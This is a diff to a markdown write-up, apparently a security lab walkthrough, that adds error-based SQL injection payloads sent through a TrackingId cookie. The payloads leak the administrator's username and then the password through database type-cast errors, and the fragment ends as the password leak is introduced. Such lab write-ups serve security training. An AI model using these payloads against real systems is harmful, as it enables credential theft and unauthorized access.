@@ -265,3 +265,17 @@ Deleting the original value of the `TrackingId` cookie to free up some additio
 ```
 TrackingId=' AND 1=CAST((SELECT username FROM users) AS int)--`
 ```
+
+```
+TrackingId=' AND 1=CAST((SELECT username FROM users LIMIT 1) AS int)--
+```
+
+ The error message now leaks the first username from the `users` table which is *administrator*:
+ ```
+ ERROR: invalid input syntax for type integer: "administrator"
+ ```
+
+```
+ TrackingId=' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--
+ ```
+ The error message now leaks the first password from the `users` table which is the actual password used for *administrator*:
